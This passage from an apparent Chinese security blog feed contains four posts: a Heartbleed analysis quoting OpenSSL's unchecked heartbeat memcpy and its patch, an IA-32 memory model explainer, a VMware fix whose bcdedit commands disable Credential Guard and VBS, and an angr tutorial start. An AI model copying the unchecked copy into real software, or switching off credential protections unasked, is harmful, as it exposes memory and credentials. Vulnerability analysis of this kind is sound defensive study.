class="comment">/*rw*/</span>	<span class="keyword">unsigned</span> <span class="keyword">char</span> *input;     <span class="comment">/* where the decode bytes are */</span></div><div class="line"><span class="comment">/*r */</span>	<span class="keyword">unsigned</span> <span class="keyword">char</span> *comp;     <span class="comment">/* only used with decompression - malloc()ed */</span></div><div class="line"><span class="comment">/*r */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> epoch;      <span class="comment">/* epoch number, needed by DTLS1 */</span></div><div class="line"><span class="comment">/*r */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> seq_num[<span class="number">8</span>];  <span class="comment">/* sequence number, needed by DTLS1 */</span></div><div class="line">&#125; SSL3_RECORD;</div></pre></td></tr></table></figure></p>
<p>由 SSL3_RECORD 结构体定义可知，每条 SSL3 记录中都包含类型字段（type）、长度字段（length）和指向记录数据的指针（data），所以 dtls1_process_heartbeat() 函数通过 p = &amp;s-&gt;s3-&gt;rrec.data[0] 将指针 p 指向心跳消息。接着把心跳类型（0x01）赋给 hbtype；使用 n2s 宏取两个字节的载荷长度（0x0155）赋给变量 payload，并将 p 指针移动 2 个字节，此时指针 p 指向心跳包载荷；最后令 pl 指向心跳包载荷。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hbtype = *p++;  <span class="comment">// 心跳包类型</span></div><div class="line">n2s(p, payload);  <span class="comment">// 心跳包载荷长度</span></div><div class="line">pl = p;  <span class="comment">// pl 指向心跳包载荷</span></div></pre></td></tr></table></figure></p>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/95471870.jpg" alt="">   </p>
<h3 id="2）分配内存空间"><a href="#2）分配内存空间" class="headerlink" title="2）分配内存空间"></a>2）分配内存空间</h3><p>解析完心跳包后，若心跳包类型为 TLS1_HB_REQUEST，则为后续构造心跳响应包分配长度为 360 bytes 的内存。<font color="red"> 这里未对心跳载荷长度字段进行检查就分配内存是漏洞产生的重要原因。</font><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (hbtype == TLS1_HB_REQUEST)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buffer, *bp;</div><div class="line">    <span class="keyword">int</span> r;</div><div class="line">    <span class="comment">/* 为心跳响应包分配内存, 大小为 1 byte(Heartbeat Type)+ 2 bytes(Payload length)+</span></div><div class="line">	  * 341 bytes(Payload) + 16 bytes(Padding) = 360 bytes */</div><div class="line">    buffer = OPENSSL_malloc(<span class="number">1</span> + <span class="number">2</span> + payload + padding);</div><div class="line">    bp = buffer;    <span class="comment">// bp指向刚分配的内存</span></div><div class="line">    …</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="3）构造心跳响应包"><a href="#3）构造心跳响应包" class="headerlink" title="3）构造心跳响应包"></a>3）构造心跳响应包</h3><p>分配好内存后构造心跳响应包。首先填充 1 bytes 的心跳包类型为 TLS1_HB_RESPONSE（0x02）；然后填充心跳包载荷长度为 payload（0x0155）；<font color="red">接着填充心跳包的内容（长度为 0x0155 bytes），这一步是漏洞产生的直接原因</font>。这里将指针 pl 所指向内存为起始，长度为 payload 字节的数据作为心跳包内容。由于指针 pl 指向用户提供的心跳请求包载荷，并且心跳包载荷长度（payload）完全由用户控制，当 payload 大于实际心跳请求包载荷的长度时，将导致越界访问内存；最后填充随机字节。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">*bp++ = TLS1_HB_RESPONSE;  <span class="comment">// 填充 1 byte 的心跳包类型</span></div><div class="line">s2n(payload, bp);  <span class="comment">// 填充 2 bytes 的载荷长度</span></div><div class="line"><span class="comment">/* 填充心跳响应包载荷（由用户提供），由于心跳包载荷长度（payload）完全由用户</span></div><div class="line">* 控制，当 payload 大于实际心跳包载荷的长度时，将导致越界访问内存。*/</div><div class="line"><span class="built_in">memcpy</span>(bp, pl, payload);</div><div class="line">bp += payload;</div><div class="line"><span class="comment">/* 填充随机字节 */</span></div><div class="line">RAND_pseudo_bytes(bp, padding);</div></pre></td></tr></table></figure></p>
<p>由 dtls1_process_heartbeat() 函数构造出的心跳响应包结构如下图所示。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/77216907.jpg" alt="">  </p>
<h3 id="4）发送心跳响应包"><a href="#4）发送心跳响应包" class="headerlink" title="4）发送心跳响应包"></a>4）发送心跳响应包</h3><p>最后通过 dtls1_write_bytes() 函数把构造好的心跳响应包发送给客户端，服务器将会把内存中除客户端发送的心跳包载荷外的其他数据返回给客户端，导致内存泄露。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 将构造好的心跳响应包写入 SSL3_RECORD 中，并返回给客户端 */</span></div><div class="line">r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, <span class="number">3</span> + payload + padding);</div></pre></td></tr></table></figure></p>
<h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p>openssl-1.0.1f 中该漏洞进行了修复，分析补丁代码可看到 dtls1_process_heartbeat() 函数在解析心跳请求包前添加了对记录长度字段 s-&gt;s3-&gt;rrec.length 的检查。</p>
<ul>
<li>检查 1：当实际心跳载荷（payload）长度为 0 时，函数返回 0；</li>
<li>检查 2：当心跳包载荷长度（payload length）大于实际载荷（payload）的长度时，函数返回 0。 </li>
</ul>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/16326376.jpg" alt=""><br>添加长度检查后，客户端只有在发送实际心跳载荷（payload）长度大于 0，且心跳包载荷长度 (payload length) 不大于实际心跳包载荷（payload）长度的心跳请求包时，服务器才会返回心跳响应包，因此可成功修补该漏洞。</p>
<hr>
<p>References:<br>[1] <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-0160/" target="_blank" rel="external">Heartbleed docker</a><br>[2] <a href="https://tools.ietf.org/html/rfc6520" target="_blank" rel="external">Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) Heartbeat Extension</a><br>[3] 强小辉, 陈波, 陈国凯. OpenSSL HeartBleed 漏洞分析及检测技术研究</p>
]]></content>
      
        <categories>
            
            <category> Vulnerability Analysis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Heartbleed </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IA-32 内存模型与地址映射]]></title>
      <url>/2018/0617/ia32-memory-model-and-address-mapping/</url>
      <content type="html"><![CDATA[<p>8086 的内部寄存器为 16 bits，同时有 20 根地址线，是第一款支持内存分段模型的处理器，它只工作在实模式下。IA-32(Intel Architecture, 32-bit) 由 1987 年的 8086 处理器发展而来，它的寄存器为 32 bits，有 32 根地址线，可以访问 2^32（4G）的内存，每次读写单位为 4 bytes。IA-32 支持平坦内存模型和分段内存模型。</p>
<h1 id="0x01-内存模型"><a href="#0x01-内存模型" class="headerlink" title="0x01 内存模型"></a>0x01 内存模型</h1><h2 id="1-平坦内存模型"><a href="#1-平坦内存模型" class="headerlink" title="1. 平坦内存模型"></a>1. 平坦内存模型</h2><p>IA-32 架构的处理器是基于分段模型的，因此需要以段为单位访问内存。平坦内存模型（Flat Model）下内存只分为一个段（相当于不分段），段基址为 0x00000000，段长度为 2^32 bytes。此时，使用的地址为线性地址，对应的地址空间为线性地址空间（0～2^32-1）。代码、数据和堆栈都分布在同一个地址空间。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/54159373.jpg" alt="">  </p>
<h2 id="2-实地址内存模型"><a href="#2-实地址内存模型" class="headerlink" title="2. 实地址内存模型"></a>2. 实地址内存模型</h2><p>实模式用于早期的 8086（16 位）处理器，由于其内部寄存器为 16 bits，但是有 20 根地址线。IA-32 向后兼容 8086，也支持实模式。该模式下逻辑地址为以下形式：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">16</span> bits 段寄存器：<span class="number">16</span> bits 段内偏移</div></pre></td></tr></table></figure></p>
<p>其中，段寄存器的值为段基址的高 16 bits。为了解决由 16 bits 的段地址和偏移地址产生 20 bytes 的线性地址的问题，使用以下方法将逻辑地址转换为线性地址：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">线性地址(<span class="number">20</span> bits) = 段选择器 &lt;&lt; <span class="number">4</span> + 段内偏移(<span class="number">16</span> bits)</div></pre></td></tr></table></figure></p>
<p>由此可知，实模式具有以下特点：</p>
<ul>
<li>段基址一定是 16 的整数倍；</li>
<li>其线性地址范围为 0～2^20-1（1M），且线性地址空间由一系列 64 KB 的段组成；</li>
<li>该模式下使用的地址为实际物理地址；</li>
<li>进程可以访问所有的内存数据，不存在用户态、内核态之分；</li>
</ul>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/53512074.jpg" alt="">  </p>
<h2 id="3-分段内存模型"><a href="#3-分段内存模型" class="headerlink" title="3. 分段内存模型"></a>3. 分段内存模型</h2><p>分段内存模型将内存空间分为独立的段，包括代码段、数据段和堆栈段。程序中使用由段选择子和偏移构成的逻辑地址访问段中内存，段选择子用于确定要访问的段，偏移地址用于定位目标段中的内存单元。IA-32 处理器最多有 16383（2^14）个段，并且每个段最大为 2^32 bytes。所有的段最终映射到处理器的线性地址空间中，访问段中内存时，处理器将逻辑地址转换为线性地址进行访问。</p>
<p>实地址模型下，一个进程可自由地读写其他进程的内存；分段内存模型下，处理器使用段描述符指定段基址、段界限、特权级别、类型等属性，程序访问内存时会进行检查，以防止对内存的违规访问。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/18565874.jpg" alt="">   </p>
<h1 id="0x2-保护模式的内存管理"><a href="#0x2-保护模式的内存管理" class="headerlink" title="0x2 保护模式的内存管理"></a>0x2 保护模式的内存管理</h1><p>1982 年，Intel 公司推出的 80286 处理器（16 bits），有 24 根地址线。80286 提出了保护模式的概念，保护模式下段寄存器的值为段选择子，根据段选择子可确定 24 bits 的段基址，因此可访问 16 MB 的内存。</p>
<p>1985 年的 80386 是 Intel 的第一款 32 bits 处理器，其寄存器为 32 bits，且有 32 根地址线，可访问 2^32（4G）的内存。80386 及后续的 32 bits 处理器都兼容实模式，在处理器刚加电时处于实模式下，进行一系列初始化后运行在保护模式下。</p>
<p>保护模式具有以下优点：</p>
<ul>
<li>横向保护，又称任务间保护。多任务操作系统中，一个任务不能破坏另一个任务的代码，这是通过内存分页以及不同任务的内存页映射到不同物理内存上来实现的。</li>
<li>纵向保护，又称任务内保护。系统代码与应用程序代码虽处于同一地址空间，但系统代码具有高权限级别，应用程序代码处于低权限级别，规定只能高权限级别代码访问低权限级别代码，这样可杜绝用户代码破坏系统代码。</li>
</ul>
<h2 id="1-描述符与内存管理寄存器"><a href="#1-描述符与内存管理寄存器" class="headerlink" title="1. 描述符与内存管理寄存器"></a>1. 描述符与内存管理寄存器</h2><h3 id="1）描述符表"><a href="#1）描述符表" class="headerlink" title="1）描述符表"></a>1）描述符表</h3><p>保护模式下，内存访问需要通过全局描述符表（GDT）或可选的本地描述符表（LDT）。这些描述符表中每一个描述符对应一个段，段描述符中存放着段基址、访问权限和类型等信息；程序以段选择子作为索引在 GDT/LDT 中找到对应的段描述符；从段描述符中可获得线性地址空间中的段基址，段基址加上偏移地址即可访问相应内存。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/14618193.jpg" alt=""><br><strong>段选择子</strong><br>段寄存器中可见部分为段选择子（16 bits），段选择子指向段描述符，其结构如下图所示：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/76427037.jpg" alt="">  </p>
<ul>
<li>Index：段描述符表索引，用于访问具体的段描述符；</li>
<li>TI：描述符表的类型，0 表示 GDT，1 表示 LDT；</li>
<li>RPL：指定请求特权级（0～3）。</li>
</ul>
<p><strong>段描述符</strong><br>段描述符是 GDT/LDT 中的一个数据结构，用于指定段的大小、地址、访问权限和状态信息，段描述符由编译器、链接器、加载器或操作系统生成。段描述符的结构如下图所示：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/2952019.jpg" alt="">  </p>
<ul>
<li>Base Address（Base 15:00+Base 23:16+Base 31:24）：32 bits 的段基址，定义段的线性地址；</li>
<li>Segment Limit（Segment Limit 15:00+ Segment Limit 19:16）：20 bits 的段限，指定段大小；</li>
</ul>
<h3 id="2）内存管理寄存器"><a href="#2）内存管理寄存器" class="headerlink" title="2）内存管理寄存器"></a>2）内存管理寄存器</h3><p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/51306321.jpg" alt=""><br>处理器提供了 4 个内存管理寄存器：GDTR、LDTR、IDTR 和 TR。</p>
<ul>
<li><strong>GDTR</strong><br>GDTR(Global Descriptor Tale Register) 用于存放 GDT 的基址（GDT 的起始地址）和 16 bits 的表限（表的大小）。处理器初始化时需在 GDTR 中设置新的基址。</li>
<li><strong>LDTR</strong><br>LDTR(Local Descriptor Tale Register) 用于存放 16 bits 的段选择码、基址（LDT 的起始地址）、段限（段大小）和属性。</li>
<li><strong>IDTR</strong><br>IDTR(Interrupt Descriptor Talbe Register) 用于存放 IDT 的基址和表限。</li>
<li><strong>TR</strong><br>TR(Task Register) 用于存放 16 bits 的段选择码、基址、段限和属性。Linux 中未使用该寄存器。</li>
</ul>
<h2 id="2-内存管理"><a href="#2-内存管理" class="headerlink" title="2. 内存管理"></a>2. 内存管理</h2><p>IA-32 中，保护模式下的内存管理分为分段和分页，分段是强制的，分页是可选的，分页机制建立在分段的基础上。分段机制将代码、数据和堆栈分开，当处理器上运行多个程序时，每个程序拥有一系列自己的段，使得不同程序间不会互相影响；分页机制将物理内存以页为单位进行分割，并按需调度，可提高内存的使用效率。在内存管理过程中涉及以下几个地址概念：</p>
<ul>
<li><strong>逻辑地址（Logical Address）</strong>：汇编语言（程序员）使用的地址由段选择子（Segment selector）和偏移量（Offset）组成。</li>
<li><strong>线性地址（Linear Address）</strong>：是逻辑地址到物理地址变换之间的中间层，32 bits 系统中为 32 bits 的无符号整数。</li>
<li><strong>物理地址（Physical Address）</strong>：CPU 用于寻址的实际物理内存地址，IA-32 的物理地址空间为 4 G（2^32 bytes）。</li>
</ul>
<p><font color="red">在未使用分页机制时，段部件将段基址加上段内偏移得到的线性地址即为物理地址；而使用分页机制之后，段部件产生的线性地址不再是物理地址，此时的线性地址也称为虚拟地址，线性地址经过页部件可转换为物理地址。</font>各地址之间的转换关系如下图所示：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/62353102.jpg" alt="">  </p>
<p>保护模式下，由逻辑地址转换为物理地址的详细过程如下图所示，地址转换需要经过逻辑地址转换和线性地址空间映射。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/72059314.jpg" alt="">  </p>
<h2 id="3-逻辑地址到线性地址"><a href="#3-逻辑地址到线性地址" class="headerlink" title="3. 逻辑地址到线性地址"></a>3. 逻辑地址到线性地址</h2><p>逻辑地址转换为线性地址的过程如下图所示：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/49065006.jpg" alt=""><br>地址转换的具体步骤如下：</p>
<ul>
<li>a. 根据指令性质确定段寄存器，如转移指令的地址在代码段，而取数据指令的地址在数据段；</li>
<li>b. 根据段寄存器（段选择子）在段描述符表中（GDT 或 LDT/TR/IDT）中找到相应的段描述符，并将其读进处理器；</li>
<li>c. 从段描述符中找到段基址；</li>
<li>d. 将指令中的地址作为偏移，与段描述符中的段长度相比，检查偏移是否越界；</li>
<li>e. 根据指令的性质和段描述符中的访问权限判断是否越权；</li>
<li>f. 将找到的段基址与偏移相加得到线性地址。</li>
</ul>
<h2 id="4-线性地址到物理地址"><a href="#4-线性地址到物理地址" class="headerlink" title="4. 线性地址到物理地址"></a>4. 线性地址到物理地址</h2><p>开启分页机制时，得到线性地址后还需将其转换为物理地址，转换过程如下图所示：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/92839624.jpg" alt="">  </p>
<p>线性地址转换为物理地址的具体步骤如下：</p>
<ul>
<li>从 CR3 寄存器中获取页目录（Page Directory）的基址；</li>
<li>以线性地址的 Directory 段为索引，在页目录中找到相应的页目录项（Page Directory Entry），在页目录项中可得到相应页表（Page Table）的基址；</li>
<li>在所得到的页表中，使用线性地址中 Table 段为索引找到页表项（Page Table Entry）；</li>
<li>将页表项中给出的页面基址与线性地址中的 Offset 段相加可得到物理地址。</li>
</ul>
<p>每个进程中 CR3 寄存器的值时独立的，它存放在进程控制块中，如 Linux 中的 task_struct 数据结构中。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-18/53378954.jpg" alt=""><br>页目录项结构如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/1534757939_2159.png" alt=""><br>页表项结构如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/1534758122_20058.png" alt=""><br>线性地址转换为物理地址的过程由内核完成，用户态进程无法访问页表，但是在 Linux 下可以使用<a href="http://0x4c43.cn/2018/0508/linux-dynamic-link/">Linux 动态链接</a>中提到的方法在用户态将线性地址转换为物理地址。</p>
<hr>
<p>References:<br>[1] 《x86 汇编语言-从实模式到保护模式》<br>[2] <a href="http://www.ilinuxkernel.com/files/Linux_Memory_Address_Mapping.pdf" target="_blank" rel="external">Linux_Memory_Address_Mapping</a><br>[3] 《Intel® 64 and IA-32 Architectures Software Developer’s Manual》<br>[4] <a href="https://liam0205.me/2016/05/01/Introduction-to-Memory-Addressing/" target="_blank" rel="external">内存寻址</a>  </p>
]]></content>
      
        <categories>
            
            <category> Operating System </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 内存模型 </tag>
            
            <tag> 地址映射 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VMware 与 Credential Guard 不兼容]]></title>
      <url>/2018/0615/vmware-is-not-compatible-with-credential-guard/</url>
      <content type="html"><![CDATA[<h1 id="0x01-Problem"><a href="#0x01-Problem" class="headerlink" title="0x01 Problem"></a>0x01 Problem</h1><p>每次更新完 Windows10 后，使用 VMware Workstation 时都会出现以下错误：</p>
<blockquote>
<p>VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation。</p>
</blockquote>
<h1 id="0x02-Solution"><a href="#0x02-Solution" class="headerlink" title="0x02 Solution"></a>0x02 Solution</h1><p>使用以下方法关闭 Windows10 系统的  Device/Credential Guard 功能可解决该问题。</p>
<h2 id="1-组策略设置"><a href="#1-组策略设置" class="headerlink" title="1. 组策略设置"></a>1. 组策略设置</h2><p>在组策略中关闭 Credential Guard。</p>
<ul>
<li>使用按键 win+r 打开运行窗口，输入 gpedit.msc 并回车打开本地组策略编辑器；</li>
<li>本地计算机策略 &gt; 计算机配置 &gt; 管理模板 &gt; 系统 &gt; Device Guard &gt; 打开基于虚拟化的安全；</li>
<li>选择禁用。</li>
</ul>
<h2 id="2-关闭-Hyper-V"><a href="#2-关闭-Hyper-V" class="headerlink" title="2. 关闭 Hyper-V"></a>2. 关闭 Hyper-V</h2><p>在控制面板中关闭 Hyper-V 功能。</p>
<ul>
<li>控制面板 &gt; 卸载程序 &gt; 启用或关闭 Windows 功能；</li>
<li>去除 Hyper-V 前的勾；</li>
<li>选择不重启。</li>
</ul>
<h2 id="3-关闭-Device-Guard"><a href="#3-关闭-Device-Guard" class="headerlink" title="3. 关闭 Device Guard"></a>3. 关闭 Device Guard</h2><ul>
<li><p>以管理员权限打开 cmd，运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mountvol X: /s</div><div class="line">copy %WINDIR%\System32\SecConfig.efi X:\EFI\Microsoft\Boot\SecConfig.efi /Y</div><div class="line">bcdedit /create &#123;0cb3b571-2f2e-4343<span class="_">-a</span>879<span class="_">-d</span>86a476d7215&#125; /d <span class="string">"DebugTool"</span> /application osloader</div><div class="line">bcdedit /<span class="built_in">set</span> &#123;0cb3b571-2f2e-4343<span class="_">-a</span>879<span class="_">-d</span>86a476d7215&#125; path <span class="string">"\EFI\Microsoft\Boot\SecConfig.efi"</span></div><div class="line">bcdedit /<span class="built_in">set</span> &#123;bootmgr&#125; bootsequence &#123;0cb3b571-2f2e-4343<span class="_">-a</span>879<span class="_">-d</span>86a476d7215&#125;</div><div class="line">bcdedit /<span class="built_in">set</span> &#123;0cb3b571-2f2e-4343<span class="_">-a</span>879<span class="_">-d</span>86a476d7215&#125; loadoptions DISABLE-LSA-ISO,DISABLE-VBS</div><div class="line">bcdedit /<span class="built_in">set</span> &#123;0cb3b571-2f2e-4343<span class="_">-a</span>879<span class="_">-d</span>86a476d7215&#125; device partition=X:</div><div class="line">mountvol X: /d</div></pre></td></tr></table></figure>
</li>
<li><p>重启计算机，按照系统引导时的提示关闭 Device Guard/Credential Guard。</p>
</li>
</ul>
<hr>
<p>References:<br>[1] <a href="https://kb.vmware.com/s/article/2146361" target="_blank" rel="external">Powering on a vm in VMware Workstation on Windows 10 host where Credential Guard/Device Guard is enabled fails with BSOD </a>   </p>
]]></content>
      
        <categories>
            
            <category> Problems&amp;Solutions </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Credential Guard </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[二进制程序分析框架 angr]]></title>
      <url>/2018/0529/binary-program-analysis-framework-angr/</url>
      <content type="html"><![CDATA[<p>angr 是一个功能强大的二进制程序分析框架，可用于程序的静态分析和动态符号执行。支持 x86、ARM、MIPS 和 PPC 架构中 32 bit 和 64 bit 可执行程序的分析。</p>
<h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>angr 是一个 python 库，适用于 python2.x 系列，暂时不支持 python3.x 系列。由于 angr 会对 libz3 和 libVEX 产生修改，为了防止对已安装库的修改而影响其他程序的使用，官方建议在 python 虚拟环境（virtualenvwrapper）中安装和使用 angr。<br>环境:</p>
<blockquote>
<p>64bit Ubuntu 16.04.4 LTS (Xenial Xerus)<br>Python 2.7.12</p>
</blockquote>
<h2 id="1-安装-virtualenvwrapper"><a href="#1-安装-virtualenvwrapper" class="headerlink" title="1. 安装 virtualenvwrapper"></a>1. 安装 virtualenvwrapper</h2><p>virtualenv 是一个可以在同一台计算机中隔离多个 Python 环境的工具。它能够用于创建独立的 Python 环境，使得多个 Python 环境互不影响。virtualenvwrapper 是 virtualenv 的扩展管理包，可以更方便地管理虚拟环境。</p>
<p>使用 pip 命令安装 virtualenvwrapper，默认安装在 /usr/local/bin 目录下。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install virtualenvwrapper</div></pre></td></tr></table></figure></p>
<p>配置环境变量 WORKON_HOME 指定虚拟环境管理目录，然后运行 virtualenvwrapper.sh 初始化配置。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> WORKON_HOME=<span class="variable">$HOME</span>/Virtualenv</div><div class="line"><span class="built_in">source</span> /usr/<span class="built_in">local</span>/bin/virtualenvwrapper.sh</div></pre></td></tr></table></figure></p>
<p>为了避免每次使用前手动执行以上命令，可以将其写入 shell 配置文件 ~/.bashrc 或 ~/.zshrc 中。</p>
<h2 id="2-安装依赖包"><a href="#2-安装依赖包" class="headerlink" title="2. 安装依赖包"></a>2. 安装依赖包</h2><p>由于安装 angr 时需要编译一些 C 文件，需要安装 python-dev 和 libffi-dev。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-dev libffi-dev build-essential</div></pre></td></tr></table></figure></p>
<h2 id="3-安装-angr"><a href="#3-安装-angr" class="headerlink" title="3. 安装 angr"></a>3. 安装 angr</h2><p>使用以下命令以开发模式安装 angr，安装完后可修改和重新编译 angr 的各模块，并且这些改动会自动反映到虚拟环境中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/angr/angr-dev</div><div class="line"><span class="built_in">cd</span> angr-dev</div><div class="line">mkvirtualenv angr</div><div class="line">./setup.sh -i</div></pre></td></tr></table></figure></p>
<h1 id="0x02-顶层接口"><a href="#0x02-顶层接口" class="headerlink" title="0x02 顶层接口"></a>0x02 顶层接口</h1><h2 id="1-Project"><a href="#1-Project" class="headerlink" title="1. Project"></a>1. Project</h2><p>angr 模块中的 Project 是分析和模拟二进制可执行文件的基础。分析程序时通过 angr.Project 将二进制程序加载到项目中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import angr</div><div class="line">&gt;&gt;&gt; proj = angr.Project(<span class="string">'fauxware'</span>)</div></pre></td></tr></table></figure></p>
<p>项目的基本属性有 CPU 架构（arch）、文件路径（filename）、入口地址（entry）。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import monkeyhex    <span class="comment"># 以十六进制显示数字</span></div><div class="line">&gt;&gt;&gt; proj.arch</div><div class="line">&lt;Arch AMD64 (LE)&gt;</div><div class="line"></div><div class="line">&gt;&gt;&gt; proj.filename</div><div class="line"><span class="string">'fauxware'</span></div><div class="line"></div><div class="line">&gt;&gt;&gt; proj.entry</div><div class="line">0x400580</div></pre></td></tr></table></figure></p>
<h2 id="2-Loader"><a href="#2-Loader" class="headerlink" title="2. Loader"></a>2. Loader</h2><p>angr 的 CLE 模块用于加载二进制程序到虚拟地址空间。加载器（loader）作为项目的一个属性可用于查看与二进制程序一起加载的共享库，并且可在加载地址空间进行查询操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; proj.loader</div><div class="line">&lt;Loaded fauxware, maps [0x400000:0x5008000]&gt;</div><div class="line"></div><div class="line">&gt;&gt;&gt; proj.loader.min_addr</div><div class="line">0x400000</div><div class="line">&gt;&gt;&gt; proj.loader.max_addr</div><div class="line">0x5008000</div><div class="line"></div><div class="line">&gt;&gt;&gt; proj.loader.shared_objects    <span class="comment"># 内存空间中的共享库</span></div><div class="line">&#123;<span class="string">'fauxware'</span>: &lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;,</div><div class="line"> u<span class="string">'libc.so.6'</span>: &lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]&gt;,</div><div class="line"> u<span class="string">'ld-linux-x86-64.so.2'</span>: &lt;ELF Object ld-2.23.so, maps [0x2000000:0x2227167]&gt;&#125;</div><div class="line"></div><div class="line">&gt;&gt;&gt; proj.loader.main_object    <span class="comment"># 加载到内存空间的主要二进制文件</span></div><div class="line">&lt;ELF Object fauxware, maps [0x400000:0x60105f]&gt;</div><div class="line"></div><div class="line">&gt;&gt;&gt; proj.loader.main_object.execstack    <span class="comment"># # 栈是否可执行</span></div><div class="line">False</div><div class="line">&gt;&gt;&gt; proj.loader.main_object.pic    <span class="comment"># 是否为PIC（位置无关代码）</span></div><div class="line">False</div></pre></td></tr></table></figure></p>
<h2 id="3-Factory"><a href="#3-Factory" class="headerlink" title="3. Factory"></a>3. Factory</h2><p>angr 中有很多类，其中大部分需要在项目中进行实例化。通过 project.factory 可以方便地使用一些常用的对象。</p>
<h3 id="1）Blocks"><a href="#1）Blocks" class="headerlink" title="1）Blocks"></a>1）Blocks</h3><p>使用 project.factory.block 可从给定的地址提取代码块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; block = proj.factory.block(proj.entry)</div><div class="line">&gt;&gt;&gt; block.pp()</div><div class="line">0x400580:       xor     ebp, ebp</div><div class="line">0x400582:       mov     r9, rdx</div><div class="line">0x400585:       pop     rsi</div><div class="line">0x400586:       mov     rdx, rsp</div><div class="line">0x400589:       and     rsp, 0xfffffffffffffff0</div><div 